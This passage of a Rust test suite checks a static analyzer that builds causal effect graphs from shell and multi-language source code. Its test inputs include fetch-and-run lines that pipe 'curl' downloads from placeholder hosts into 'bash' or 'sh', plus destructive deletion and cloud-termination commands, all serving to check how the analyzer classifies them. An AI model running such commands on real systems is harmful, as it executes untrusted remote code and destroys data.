    assert_eq!(plan.causality.coverage.level, CoverageLevel::Partial);
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .any(|node| matches!(
                &node.occurrence,
                OccurrenceKind::Boundary { limit: Some(limit), .. }
                    if limit == "max_causal_condition"
            ))
    );
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .any(|edge| {
                edge.reason == CausalReason::ResourceTransition
                    && edge
                        .condition
                        .as_ref()
                        .is_some_and(|condition| condition.is_widened())
            })
    );
}

/// The arms an occurrence's condition places it in, as `(group, arm)` pairs.
fn arms(plan: &Plan, id: &effinterp_proto::OccurrenceId) -> Vec<(String, usize)> {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .find(|node| node.id == *id)
        .and_then(|node| node.condition.as_ref())
        .into_iter()
        .flat_map(|condition| condition.atoms())
        .filter(|atom| atom.origin.kind == effinterp_proto::ConditionKind::Branch)
        .map(|atom| {
            (
                effinterp_proto::stable_hash("effinterp/condition-branch/v1", &atom.origin),
                atom.arm as usize,
            )
        })
        .collect()
}

fn transitions(plan: &Plan) -> impl Iterator<Item = &effinterp_proto::CausalEdge> {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransition)
}

#[test]
fn mutually_exclusive_shell_branches_do_not_form_state_transitions() {
    for source in [
        "touch /tmp/a; if [ -f /tmp/g ]; then rm /tmp/a; else touch /tmp/a; fi",
        "touch /tmp/a; case \"$X\" in a) rm /tmp/a;; b) touch /tmp/a;; esac",
    ] {
        let plan = shell(source);
        let graph = plan.causality.graph.as_ref().unwrap();
        let optional_executions: BTreeSet<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.condition.is_some())
            .map(|effect| effect.execution)
            .collect();
        let optional_ports: BTreeSet<_> = graph
            .nodes
            .iter()
            .filter(|node| {
                matches!(node.occurrence, OccurrenceKind::Port { .. })
                    && node
                        .execution
                        .is_some_and(|execution| optional_executions.contains(&execution))
            })
            .map(|node| &node.id)
            .collect();
        assert!(!optional_ports.is_empty());
        // Exact command resolution in an optional arm is not a reachability proof.
        assert!(
            graph
                .nodes
                .iter()
                .filter(|node| optional_ports.contains(&node.id))
                .all(|node| node.modality == Modality::May && node.cardinality.min == 0)
        );
        assert!(
            graph
                .edges
                .iter()
                .filter(
                    |edge| edge.reason == CausalReason::Launch && optional_ports.contains(&edge.to)
                )
                .all(|edge| edge.modality == Modality::May && edge.cardinality.min == 0)
        );
        let in_arm = |id: &effinterp_proto::OccurrenceId, arm: usize| {
            arms(&plan, id).iter().any(|(_, entered)| *entered == arm)
        };
        assert!(
            plan.causality
                .graph
                .as_ref()
                .expect("causality detail required")
                .nodes
                .iter()
                .any(|node| in_arm(&node.id, 0))
        );
        assert!(
            plan.causality
                .graph
                .as_ref()
                .expect("causality detail required")
                .nodes
                .iter()
                .any(|node| in_arm(&node.id, 1))
        );
        assert!(transitions(&plan).all(|edge| !(in_arm(&edge.from, 0) && in_arm(&edge.to, 1))));
        for arm in [0, 1] {
            assert!(transitions(&plan).any(|edge| {
                plan.causality
                    .graph
                    .as_ref()
                    .expect("causality detail required")
                    .nodes
                    .iter()
                    .find(|node| node.id == edge.from)
                    .is_some_and(|node| node.condition.is_none())
                    && in_arm(&edge.to, arm)
            }));
        }
    }
}

#[test]
fn an_elif_test_is_ordered_with_the_arms_it_guards() {
    // The `grep` runs whenever the first arm is skipped, so its read always
    // precedes the `else` arm's delete: the two are not exclusive.
    let plan = shell(
        "if [ -f /tmp/g ]; then echo one; elif grep -q x /tmp/a; then echo two; else rm /tmp/a; fi",
    );
    let operation = |id: &effinterp_proto::OccurrenceId| {
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .find(|node| node.id == *id)
            .and_then(|node| match &node.occurrence {
                OccurrenceKind::ResourceInteraction { operation, .. } => Some(operation.0.clone()),
                _ => None,
            })
    };
    assert!(transitions(&plan).any(|edge| {
        operation(&edge.from).as_deref() == Some("filesystem.read")
            && operation(&edge.to).as_deref() == Some("filesystem.delete")
    }));
}

#[test]
fn a_completed_branch_construct_retires_the_state_before_it() {
    // Every path through the first `if` writes the log, so the write before
    // it is no longer the file's most recent state afterwards.
    let plan = shell(
        "echo start >> /var/log/app.log; \
         if [ -f /tmp/g ]; then echo a >> /var/log/app.log; else echo b >> /var/log/app.log; fi; \
         if [ -f /tmp/h ]; then echo c >> /var/log/app.log; else echo d >> /var/log/app.log; fi",
    );
    let unconditional: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .filter(|node| {
            matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. })
                && node.condition.is_none()
        })
        .map(|node| node.id.clone())
        .collect();
    assert_eq!(unconditional.len(), 1);
    // The first write reaches only the arms of the construct right after it.
    assert_eq!(
        transitions(&plan)
            .filter(|edge| edge.from == unconditional[0])
            .count(),
        2
    );
    // No transition skips a construct whose arms cover every path.
    assert!(transitions(&plan).all(|edge| {
        let from = arms(&plan, &edge.from);
        let to = arms(&plan, &edge.to);
        from.is_empty() || to.is_empty() || from.len() == to.len()
    }));
    assert_eq!(transitions(&plan).count(), 6);
}

/// An `if` without an `else` may run no arm at all, so the state before it
/// survives the construct.
#[test]
fn an_open_branch_keeps_the_state_that_preceded_it() {
    let plan = shell(
        "echo start >> /var/log/app.log; \
         if [ -f /tmp/g ]; then echo a >> /var/log/app.log; fi; \
         echo end >> /var/log/app.log",
    );
    let end = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .filter(|node| {
            matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. })
                && node.condition.is_none()
        })
        .next_back()
        .expect("an unconditional occurrence")
        .id
        .clone();
    assert_eq!(transitions(&plan).filter(|edge| edge.to == end).count(), 2);
}

#[test]
fn causal_reachability_caps_are_visible_and_widen_cardinality() {
    let subject = Subject::Exec {
        argv: vec!["tool".into()],
        cwd: Some("/w".into()),
        context: Default::default(),
    };
    let mut limits = default_limits();
    limits.insert("max_causal_depth".into(), 16);
    limits.insert("max_causal_pairs".into(), 64);
    let mut builder = PlanBuilder::new(
        subject,
        "test".into(),
        "test".into(),
        AnalysisLimits::from_map(&limits).unwrap(),
    );
    builder.declare_coverage(Domain::new("filesystem"), CoverageLevel::Full);
    for _ in 0..100 {
        builder.effect(Effect {
            request_assurance: effinterp_proto::RequestAssurance::Conservative,
            id: Default::default(),
            operation: Operation::new("filesystem.write"),
            resource: ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/w/state".into(),
                },
            },
            attributes: Default::default(),
            modality: Modality::May,
            realm: ExecutionRealm::Host,
            condition: None,
            execution: ExecutionNodeRef(0),
            provenance: Vec::new(),
        });
    }
    let plan = builder.finish().unwrap();
    assert_eq!(plan.causality.coverage.level, CoverageLevel::Partial);
    assert!(plan.coverage.is_full(&Domain::new("filesystem")));
    assert!(!plan.causality.coverage.gaps.is_empty());
    for limit in ["max_causal_depth", "max_causal_pairs"] {
        assert!(plan.boundaries.iter().any(|boundary| {
            boundary.reason.as_str() == "limit_saturated"
                && boundary.limit.as_deref() == Some(limit)
        }));
        assert!(plan.causality.graph.as_ref().expect("causality detail required").nodes.iter().any(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::Boundary { limit: Some(node_limit), .. } if node_limit == limit
            ) && node.cardinality == effinterp_proto::CausalCardinality::WIDENED
        }));
    }
}

#[test]
fn resource_only_plan_still_has_stable_state_occurrences() {
    let plan = shell("rm -rf ./cache");
    let resources: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .filter(|node| matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. }))
        .collect();
    assert_eq!(resources.len(), plan.effects.len());
    assert!(resources.iter().all(|node| node.cardinality.min == 0));
    assert!(resources.iter().all(|node| node.modality == Modality::May));
}

#[test]
fn resource_transitions_require_one_typed_identity() {
    let subject = Subject::Exec {
        argv: vec!["tool".into()],
        cwd: Some("/w".into()),
        context: Default::default(),
    };
    let mut builder = PlanBuilder::new(
        subject,
        "test".into(),
        "test".into(),
        AnalysisLimits::default(),
    );
    for domain in ["environment", "filesystem", "network"] {
        builder.declare_coverage(Domain::new(domain), CoverageLevel::Full);
    }
    for (operation, resource) in [
        (
            "environment.read",
            ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name: "CFG".into() },
            },
        ),
        (
            "filesystem.read",
            ResourceExpr::Environment { name: "CFG".into() },
        ),
        (
            "filesystem.write",
            ResourceExpr::Environment { name: "CFG".into() },
        ),
        (
            "network.request",
            ResourceExpr::Unresolved {
                family: effinterp_proto::ResourceFamily::new("network"),
            },
        ),
        (
            "network.download",
            ResourceExpr::Unresolved {
                family: effinterp_proto::ResourceFamily::new("network"),
            },
        ),
        (
            "filesystem.read",
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/w/state".into(),
                },
            },
        ),
        (
            "filesystem.write",
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/w/state".into(),
                },
            },
        ),
    ] {
        builder.effect(Effect {
            request_assurance: effinterp_proto::RequestAssurance::Conservative,
            id: Default::default(),
            operation: Operation::new(operation),
            resource,
            attributes: Default::default(),
            modality: Modality::May,
            realm: ExecutionRealm::Host,
            condition: None,
            execution: ExecutionNodeRef(0),
            provenance: Vec::new(),
        });
    }
    let plan = builder.finish().unwrap();
    let transition_operations: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransition)
        .map(|edge| {
            let operation = |id: &effinterp_proto::OccurrenceId| {
                plan.causality
                    .graph
                    .as_ref()
                    .expect("causality detail required")
                    .nodes
                    .iter()
                    .find(|node| node.id == *id)
                    .and_then(|node| match &node.occurrence {
                        OccurrenceKind::ResourceInteraction { operation, .. } => {
                            Some(operation.0.as_str())
                        }
                        _ => None,
                    })
                    .unwrap()
            };
            (operation(&edge.from), operation(&edge.to))
        })
        .collect();
    assert_eq!(
        transition_operations,
        [
            ("filesystem.read", "filesystem.write"),
            ("filesystem.read", "filesystem.write"),
        ]
    );
}

#[test]
fn resource_transitions_retain_unknown_scope_without_crossing_known_namespaces() {
    let mut builder = PlanBuilder::new(
        Subject::Exec {
            argv: vec!["tool".into()],
            cwd: Some("/w".into()),
            context: Default::default(),
        },
        "test".into(),
        "test".into(),
        AnalysisLimits::default(),
    );
    builder.declare_coverage(Domain::new("messaging"), CoverageLevel::Full);
    for operation in ["messaging.create", "messaging.delete"] {
        builder.effect(Effect {
            request_assurance: effinterp_proto::RequestAssurance::Conservative,
            id: Default::default(),
            operation: Operation::new(operation),
            resource: ResourceExpr::Concrete {
                identity: ResourceIdentity::MessageTopic {
                    system: Some("kafka".into()),
                    name: "t".into(),
                    scope: Box::new(effinterp_proto::messaging_scope(Some("kafka"))),
                },
            },
            attributes: Default::default(),
            modality: Modality::MustOnSuccess,
            realm: ExecutionRealm::Host,
            condition: None,
            execution: ExecutionNodeRef(0),
            provenance: Vec::new(),
        });
    }
    let plan = builder.finish().unwrap();
    let transitions: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| edge.reason == CausalReason::ResourceTransition)
        .collect();
    assert_eq!(transitions.len(), 1);
    assert_eq!(transitions[0].assurance, CausalAssurance::Conservative);
    assert_eq!(transitions[0].modality, Modality::May);
    assert_eq!(transitions[0].cardinality.min, 0);
    assert_eq!(transitions[0].cardinality.max, None);
    let interactions: Vec<_> = plan
        .causality
        .graph
        .as_ref()
        .unwrap()
        .nodes
        .iter()
        .filter(|node| matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. }))
        .collect();
    assert_eq!(interactions.len(), 2);
    for interaction in interactions {
        assert_eq!(interaction.modality, Modality::MustOnSuccess);
        assert_eq!(interaction.cardinality.min, 1);
        assert_eq!(interaction.cardinality.max, None);
    }

    for (source, expected) in [
        (
            "kafka-topics --create --topic t --bootstrap-server a:9092; kafka-topics --delete --topic t --bootstrap-server a:9092",
            1,
        ),
        (
            "kafka-topics --create --topic t --bootstrap-server a:9092; kafka-topics --delete --topic t --bootstrap-server b:9092",
            1,
        ),
        (
            "aws ec2 terminate-instances --instance-ids i-1; aws ec2 terminate-instances --instance-ids i-1",
            1,
        ),
        ("aws s3 rm s3://b/k; aws s3 rm s3://b/k", 1),
        (
            "rabbitmqctl -p /a purge_queue q; rabbitmqctl -p /b delete_queue q",
            0,
        ),
        (
            "aws --region eu-west-1 ec2 terminate-instances --instance-ids i-1; aws --region us-east-1 ec2 terminate-instances --instance-ids i-1",
            0,
        ),
    ] {
        let plan = shell(source);
        let transitions: Vec<_> = plan
            .causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .filter(|edge| edge.reason == CausalReason::ResourceTransition)
            .filter(|edge| {
                plan.causality
                    .graph
                    .as_ref()
                    .expect("causality detail required")
                    .nodes
                    .iter()
                    .any(|node| {
                        node.id == edge.from
                            && matches!(&node.occurrence,
                    OccurrenceKind::ResourceInteraction { operation, .. }
                        if matches!(operation.domain(), "cloud" | "messaging"))
                    })
            })
            .collect();
        assert_eq!(transitions.len(), expected, "{source}");
        assert!(
            transitions
                .iter()
                .all(|edge| edge.modality == Modality::May)
        );
    }
}

#[test]
fn source_frontends_preserve_boolean_arms_and_loop_guards() {
    use effinterp_proto::{ConditionKind, SourceDialect};
    for (language, source) in [
        (
            "python",
            "import os\nif flag:\n os.remove('/yes')\nelse:\n os.remove('/no')\nwhile flag:\n os.remove('/loop')\n",
        ),
        (
            "js",
            "const fs = require('fs'); if (flag) { fs.unlinkSync('/yes'); } else { fs.unlinkSync('/no'); } while (flag) { fs.unlinkSync('/loop'); }",
        ),
        (
            "rust",
            "fn main() { if flag { std::fs::remove_file(\"/yes\"); } else { std::fs::remove_file(\"/no\"); } while flag { std::fs::remove_file(\"/loop\"); } }",
        ),
        (
            "ruby",
            "if flag\n File.delete('/yes')\nelse\n File.delete('/no')\nend\nwhile flag\n File.delete('/loop')\nend",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { if flag { os.Remove(\"/yes\") } else { os.Remove(\"/no\") }; for flag { os.Remove(\"/loop\") } }",
        ),
        (
            "java",
            "import java.nio.file.*; class Main { public static void main(String[] args) throws Exception { if (flag) { Files.delete(Path.of(\"/yes\")); } else { Files.delete(Path.of(\"/no\")); } while (flag) { Files.delete(Path.of(\"/loop\")); } } }",
        ),
        (
            "php",
            "<?php if ($flag) { unlink('/yes'); } else { unlink('/no'); } while ($flag) { unlink('/loop'); }",
        ),
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                language: language.into(),
                dialect: (language == "js").then_some(SourceDialect::Js),
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        let effect = |path: &str| {
            plan.effects.iter().find(|e| e.operation.0 == "filesystem.delete" && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: p } } if p == path)).unwrap_or_else(|| panic!("missing {language} sink {path}: {:?}", plan.effects))
        };
        let yes = effect("/yes")
            .condition
            .as_ref()
            .unwrap_or_else(|| panic!("unguarded {language} branch"));
        let no = effect("/no")
            .condition
            .as_ref()
            .unwrap_or_else(|| panic!("unguarded {language} alternative"));
        let yes = yes
            .atoms()
            .into_iter()
            .find(|a| a.origin.kind == ConditionKind::Branch)
            .unwrap();
        let no = no
            .atoms()
            .into_iter()
            .find(|a| a.origin.kind == ConditionKind::Branch)
            .unwrap();
        assert_eq!(yes.origin, no.origin, "{language}");
        assert_eq!(
            (yes.polarity, no.polarity),
            (Some(true), Some(false)),
            "{language}"
        );
        assert_eq!((yes.arm, no.arm, yes.arms), (0, 1, 2), "{language}");
        assert!(yes.origin.source_digest.starts_with("blake3:"));
        assert!(
            effect("/loop")
                .condition
                .as_ref()
                .unwrap()
                .atoms()
                .iter()
                .any(|a| a.origin.kind == ConditionKind::Loop),
            "{language}"
        );
    }
}

#[test]
fn early_return_tails_keep_the_surviving_arm_in_every_source_frontend() {
    use effinterp_proto::{ConditionKind, SourceDialect};
    for (language, source) in [
        (
            "python",
            "import os\ndef wipe(flag):\n if flag:\n  return\n os.remove('/tail')\nwipe(flag)\nwipe(flag)\n",
        ),
        (
            "js",
            "const fs = require('fs'); function wipe(flag) { if (flag) return; fs.unlinkSync('/tail'); } wipe(flag); wipe(flag);",
        ),
        (
            "rust",
            "fn wipe(flag: bool) { if flag { return; } std::fs::remove_file(\"/tail\"); } fn main() { wipe(flag); wipe(flag); }",
        ),
        (
            "ruby",
            "def wipe(flag)\n if flag\n  return\n end\n system('rm /tail')\nend\nwipe(flag)\nwipe(flag)\n",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc wipe(flag bool) { if flag { return }; os.Remove(\"/tail\") }\nfunc main() { wipe(flag); wipe(flag) }",
        ),
        (
            "java",
            "import java.nio.file.*; class Main { static void wipe(boolean flag) throws Exception { if (flag) { return; } Files.delete(Path.of(\"/tail\")); } public static void main(String[] args) throws Exception { wipe(flag); wipe(flag); } }",
        ),
        (
            "php",
            "<?php function wipe($flag) { if ($flag) { return; } unlink('/tail'); } wipe($flag); wipe($flag);",
        ),
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                language: language.into(),
                dialect: (language == "js").then_some(SourceDialect::Js),
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        let effect = plan.effects.iter().find(|e| e.operation.0 == "filesystem.delete" && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/tail")).unwrap_or_else(|| panic!("missing {language} tail sink"));
        let calls: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "filesystem.delete")
            .collect();
        assert_eq!(calls.len(), 2, "{language}: {calls:?}");
        assert_ne!(
            calls[0].condition.as_ref().map(Condition::identity_key),
            calls[1].condition.as_ref().map(Condition::identity_key),
            "merged {language} call instances"
        );
        let condition = effect
            .condition
            .as_ref()
            .unwrap_or_else(|| panic!("unguarded {language} tail"));
        assert!(
            condition
                .atoms()
                .iter()
                .any(|a| a.origin.kind == ConditionKind::Branch && a.polarity == Some(false)),
            "{language}: {condition:?}"
        );
    }
}

#[test]
fn multi_arm_guards_preserve_alternatives_without_sibling_resource_transitions() {
    use effinterp_proto::{ConditionKind, SourceDialect};
    for (language, source) in [
        (
            "shell",
            "case $choice in a) rm /target;; b) rm /target;; *) rm /target;; esac",
        ),
        (
            "python",
            "import os\nmatch choice:\n case 1:\n  os.remove('/target')\n case 2:\n  os.remove('/target')\n case _:\n  os.remove('/target')\n",
        ),
        (
            "js",
            "const fs = require('fs'); switch(choice) { case 1: fs.unlinkSync('/target'); break; case 2: fs.unlinkSync('/target'); break; default: fs.unlinkSync('/target'); }",
        ),
        (
            "rust",
            "fn main() { match choice { 1 => { std::fs::remove_file(\"/target\"); }, 2 => { std::fs::remove_file(\"/target\"); }, _ => { std::fs::remove_file(\"/target\"); } } }",
        ),
        (
            "ruby",
            "case choice\nwhen 1\n File.delete('/target')\nwhen 2\n File.delete('/target')\nelse\n File.delete('/target')\nend\n",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { switch choice { case 1: os.Remove(\"/target\"); case 2: os.Remove(\"/target\"); default: os.Remove(\"/target\") } }",
        ),
        (
            "java",
            "import java.nio.file.*; class Main { public static void main(String[] args) throws Exception { switch(choice) { case 1: Files.delete(Path.of(\"/target\")); break; case 2: Files.delete(Path.of(\"/target\")); break; default: Files.delete(Path.of(\"/target\")); } } }",
        ),
        (
            "php",
            "<?php switch ($choice) { case 1: unlink('/target'); break; case 2: unlink('/target'); break; default: unlink('/target'); }",
        ),
    ] {
        let plan = if language == "shell" {
            shell(source)
        } else {
            Engine::new()
                .with_causality_detail(true)
                .analyze(&Subject::Source {
                    language: language.into(),
                    dialect: (language == "js").then_some(SourceDialect::Js),
                    source: source.into(),
                    cwd: Some("/w".into()),
                    context: Default::default(),
                })
                .unwrap()
        };
        validate_plan(&plan).unwrap();
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "filesystem.delete")
            .collect();
        assert_eq!(effects.len(), 3, "{language}");
        let arms: Vec<_> = effects
            .iter()
            .map(|e| {
                e.condition
                    .as_ref()
                    .unwrap_or_else(|| panic!("unguarded {language} alternative"))
                    .atoms()
                    .into_iter()
                    .find(|a| a.origin.kind == ConditionKind::Branch)
                    .unwrap()
            })
            .collect();
        assert!(
            arms.iter()
                .all(|a| a.origin == arms[0].origin && a.arms == 3 && a.polarity.is_none()),
            "{language}: {arms:?}"
        );
        assert_eq!(
            arms.iter().map(|a| a.arm).collect::<BTreeSet<_>>().len(),
            3,
            "{language}"
        );
        assert!(
            !plan
                .causality
                .graph
                .as_ref()
                .expect("causality detail required")
                .edges
                .iter()
                .any(|e| e.reason == CausalReason::ResourceTransition),
            "sibling transition in {language}"
        );
    }
    let plan = shell("f() { if test flag; then return; fi; rm /tail; }; f");
    assert!(
        plan.effects
            .iter()
            .find(|e| e.operation.0 == "filesystem.delete")
            .unwrap()
            .condition
            .as_ref()
            .unwrap()
            .atoms()
            .iter()
            .any(|a| a.polarity == Some(false))
    );
}

/// A `try` body always executes: only its handlers are selected by an
/// unresolved exception, and neither shape is an analysis limit.
#[test]
fn exception_handlers_guard_only_their_own_arm_in_every_source_frontend() {
    use effinterp_proto::{ConditionKind, SourceDialect};
    for (language, source) in [
        (
            "python",
            "import os\ntry:\n os.remove('/body')\nexcept OSError:\n os.remove('/handler')\n",
        ),
        (
            "js",
            "const fs = require('fs'); try { fs.unlinkSync('/body'); } catch (e) { fs.unlinkSync('/handler'); }",
        ),
        (
            "ruby",
            "begin\n File.delete('/body')\nrescue\n File.delete('/handler')\nend",
        ),
        (
            "java",
            "import java.nio.file.*; class Main { public static void main(String[] args) { try { Files.delete(Path.of(\"/body\")); } catch (Exception e) { Files.delete(Path.of(\"/handler\")); } } }",
        ),
        (
            "php",
            "<?php try { unlink('/body'); } catch (Exception $e) { unlink('/handler'); }",
        ),
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                language: language.into(),
                dialect: (language == "js").then_some(SourceDialect::Js),
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        let effect = |path: &str| {
            plan.effects.iter().find(|e| e.operation.0 == "filesystem.delete" && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: p } } if p == path)).unwrap_or_else(|| panic!("missing {language} sink {path}: {:?}", plan.effects))
        };
        assert!(
            effect("/body").condition.is_none(),
            "{language} try body is guarded: {:?}",
            effect("/body").condition
        );
        assert!(
            effect("/handler")
                .condition
                .as_ref()
                .unwrap_or_else(|| panic!("unguarded {language} handler"))
                .atoms()
                .iter()
                .any(|a| a.origin.kind == ConditionKind::UnresolvedExecution),
            "{language}"
        );
        assert!(
            !plan.boundaries.iter().any(|boundary| boundary
                .limit
                .as_deref()
                .is_some_and(|limit| limit == "max_causal_condition")),
            "{language} reports a guard limit for an ordinary try: {:?}",
            plan.boundaries
        );
        assert_eq!(
            plan.causality.coverage.level,
            CoverageLevel::Full,
            "{language}"
        );
    }
}

#[test]
fn selected_main_file_bindings_require_the_owning_interpreter_proof() {
    // Missing file bytes must not erase a proved selector. Conversely, config,
    // preload and syntax-check reads must never become the selected code input.
    for source in [
        "bash payload.sh",
        "curl https://example.com/payload | bash payload.sh",
        "./payload.sh",
        "curl -o cat https://example.com/payload; ./cat",
        "sh -- payload.sh --help",
        "node app.js",
        "node -- app.js --check",
        "curl -o payload.sh https://example.com/payload; bash payload.sh",
        "cat app.js >/dev/null; node app.js",
        "node app.js; node app.js",
    ] {
        let plan = shell(source);
        assert!(
            exact_value_edge(&plan, "filesystem.read", "process.code_execution"),
            "{source}"
        );
        if source.contains(" | ") {
            assert!(
                !reaches(&plan, "network.download", "process.code_execution"),
                "{source}"
            );
        }
        let graph = graph(&plan);
        for edge in graph.edges.iter().filter(|edge| {
            edge.assurance == CausalAssurance::Exact
                && node_operation(graph, &edge.from) == Some("filesystem.read")
                && node_operation(graph, &edge.to) == Some("process.code_execution")
        }) {
            let read = graph
                .nodes
                .iter()
                .find(|node| node.id == edge.from)
                .unwrap();
            let code = graph.nodes.iter().find(|node| node.id == edge.to).unwrap();
            assert_eq!(read.execution, code.execution, "{source}");
            assert!(!read.provenance.is_empty(), "{source}");
            assert_eq!(read.provenance, code.provenance, "{source}");
        }
    }
    struct EmptyScript;
    impl effinterp_engine::SourceResolver for EmptyScript {
        fn resolve(
            &self,
            _: effinterp_engine::SourceRequest<'_>,
        ) -> effinterp_engine::SourceResponse {
            effinterp_engine::SourceResponse::Source(Vec::new())
        }

        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    for source in ["bash payload.sh", "node app.js"] {
        let plan = Engine::new()
            .with_resolver(Box::new(EmptyScript))
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            exact_value_edge(&plan, "filesystem.read", "process.code_execution"),
            "{source}"
        );
    }
    for source in [
        "bash -n payload.sh",
        "node --check app.js",
        "node --env-file .env app.js",
        "node --require preload.js app.js",
        "bash --rcfile config payload.sh",
        "bash \"$SCRIPT\"",
        "node \"$SCRIPT\"",
        "node app.js \"$ARG\"",
        "./payload.sh \"$ARG\"",
        "dash payload.sh",
    ] {
        assert!(
            !exact_value_edge(&shell(source), "filesystem.read", "process.code_execution"),
            "{source}"
        );
    }
}

#[test]
fn interpreter_captured_command_output_reaches_a_piped_shell_only_when_printed() {
    for command in [
        "ruby -e '`curl https://x`' | sh",
        "ruby -e '%x(curl https://x)' | sh",
        "php -r '`curl https://x`;' | sh",
        "php -r 'shell_exec(\"curl https://x\");' | sh",
        "php -r 'exec(\"curl https://x\");' | sh",
        "ruby -e 'x = `curl https://x`; puts 1' | sh",
        "php -r '$x = shell_exec(\"curl https://x\"); echo 1;' | sh",
        "php -r 'print_r(shell_exec(\"curl https://x\"), true);' | sh",
        "php -r 'print_r(shell_exec(\"curl https://x\"), (true));' | sh",
        "php -r '$mode = true; print_r(shell_exec(\"curl https://x\"), $mode);' | sh",
        // A function's assignment is local to it.
        "php -r '$mode = true; function f() { $mode = false; } f(); print_r(shell_exec(\"curl https://x\"), $mode);' | sh",
        "php -r '$x = shell_exec(\"curl https://x\"); $x = \"echo safe\"; echo $x;' | sh",
        "php -r '$x = shell_exec(\"curl https://x\"); unset($x); echo $x;' | sh",
        "ruby -e 'x = `curl https://x`; x = \"echo safe\"; puts x' | sh",
        // A post-test loop's body runs at least once.
        "ruby -e 'x = `curl https://x`; begin; x = \"echo safe\"; end while false; puts x' | sh",
        "ruby -e 'x = `curl https://x`; begin; x = \"echo safe\"; end until true; puts x' | sh",
        "ruby -e 'x = `curl https://x`; begin; begin; x = \"echo safe\"; end; end while false; puts x' | sh",
        // A length, a predicate or an unprinted format argument is not the
        // captured text.
        "ruby -e 'puts `curl https://x`.length' | sh",
        "ruby -e 'puts `curl https://x`.empty?' | sh",
        "ruby -e 'printf(\"echo safe\", `curl https://x`)' | sh",
        "php -r 'echo strlen(shell_exec(\"curl https://x\"));' | sh",
        "php -r 'printf(\"echo safe\", shell_exec(\"curl https://x\"));' | sh",
        "php -r 'echo (shell_exec(\"curl https://x\") ? \"echo safe\" : \"echo fine\");' | sh",
        // A `*` width consumes its own argument; the value prints as a number.
        "ruby -e 'printf(\"%*d\", 5, `curl https://x`)' | sh",
        "php -r 'printf(\"%*d\", 5, shell_exec(\"curl https://x\"));' | sh",
    ] {
        let plan = shell(command);
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
    // An unknown `print_r` mode, an unread format, a precision that may cut
    // the text, or an overwrite in a rescue body may or may not leave the
    // captured bytes in the output: a boundary, not a flow.
    struct ModeFile;
    impl effinterp_engine::SourceResolver for ModeFile {
        fn resolve(
            &self,
            _: effinterp_engine::SourceRequest<'_>,
        ) -> effinterp_engine::SourceResponse {
            effinterp_engine::SourceResponse::Source(b"<?php $mode = true;".to_vec())
        }

        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    for command in [
        "php -r 'print_r(shell_exec(\"curl https://x\"), $m);' | sh",
        "php -r '$fmt = \"%d\"; printf($fmt, shell_exec(\"curl https://x\"));' | sh",
        "ruby -e 'printf(f, `curl https://x`)' | sh",
        "php -r 'printf(\"%.*s\", 0, shell_exec(\"curl https://x\"));' | sh",
        "ruby -e 'printf(\"%.*s\", 0, `curl https://x`)' | sh",
        "php -r 'echo sprintf(\"%*.*s\", 5, 0, shell_exec(\"curl https://x\"));' | sh",
        "ruby -e 'puts format(\"%.0s\", `curl https://x`)' | sh",
        "ruby -e 'x = `curl https://x`; begin; x = \"echo safe\"; rescue; x = \"echo fine\"; end while false; puts x' | sh",
        // Included code runs in the including scope and may change the mode.
        "php -r '$mode = false; include \"mode.php\"; print_r(shell_exec(\"curl https://x\"), $mode);' | sh",
    ] {
        let plan = Engine::new()
            .with_resolver(Box::new(ModeFile))
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: command.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
